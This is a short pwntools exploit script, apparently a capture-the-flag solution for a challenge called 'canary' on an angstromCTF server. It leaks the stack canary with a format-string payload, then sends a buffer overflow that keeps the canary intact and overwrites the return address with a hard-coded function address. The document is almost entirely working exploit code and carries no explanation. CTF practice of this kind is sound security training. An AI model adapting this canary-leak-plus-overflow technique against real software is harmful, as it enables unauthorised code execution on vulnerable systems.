from pwn import *

payload='%17$p'

#p = process('./canary')
p = remote('shell.actf.co', 20701)
print p.recvuntil('Hi! What\'s your name?')
p.sendline(payload)
a = p.recvline()
address = p64(int(a.split()[4][:-1],16))
print a
payload = 'A'*56+address+'AAAAAAAA'+p64(int('0x0000000000400787',16))
print p.recv()
p.sendline(payload)
print p.recv()
